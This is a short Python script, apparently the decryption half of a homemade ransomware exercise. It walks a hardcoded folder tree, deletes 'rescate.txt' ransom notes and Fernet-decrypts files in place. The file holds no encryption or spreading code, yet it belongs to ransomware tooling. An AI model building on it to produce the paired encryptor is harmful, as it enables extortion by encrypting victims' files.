from cryptography.fernet import Fernet
import os

def cargar_key():
    return open('key.key', 'rb').read()

def decrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(item, 'wb') as file:
            file.write(decrypted_data)

def rutas(directorio, key): 
    with os.scandir(directorio) as ficheros:
        subdirectorios = [fichero.name for fichero in ficheros if fichero.is_dir()]

    cant = 0
    for elemen in subdirectorios:
        dato = directorio+"\\"
        dato = dato+subdirectorios[cant]
        print(dato)
        os.remove(dato+'\\'+'rescate.txt')
        with os.scandir(dato)as ficheros:
            ficheros = [fichero.name for fichero in ficheros if fichero.is_file()]
        print(ficheros)
        full_path = [dato+'\\'+item for item in ficheros]

        decrypt(full_path, key)
        cant += 1
        rutas(dato,key)

if __name__ == '__main__':
    key = cargar_key()
    path_to_encrypt = 'C:\\hacking\\D'

    rutas(path_to_encrypt, key)
    os.remove(path_to_encrypt+'\\'+'rescate.txt')
    with os.scandir(path_to_encrypt)as ficheros:
        ficheros = [fichero.name for fichero in ficheros if fichero.is_file()]
    print(ficheros)
    
    full_path = [path_to_encrypt+'\\'+item for item in ficheros]

    decrypt(full_path, key)